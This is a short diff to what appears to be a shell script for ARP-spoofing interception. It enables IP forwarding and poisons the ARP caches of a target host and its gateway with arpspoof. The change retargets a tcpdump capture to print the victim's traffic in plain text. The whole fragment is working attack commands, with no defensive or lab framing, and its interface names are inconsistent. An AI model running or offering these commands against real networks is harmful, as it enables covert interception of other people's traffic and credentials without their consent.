@@ -7,4 +7,4 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 arpspoof -i enp30s0 -t 192.168.178.33 -r 192.168.178.1
 
-tcpdump -i eth0 -A host 192.168.0.5
+tcpdump -i eth0 -A host 192.168.178.33
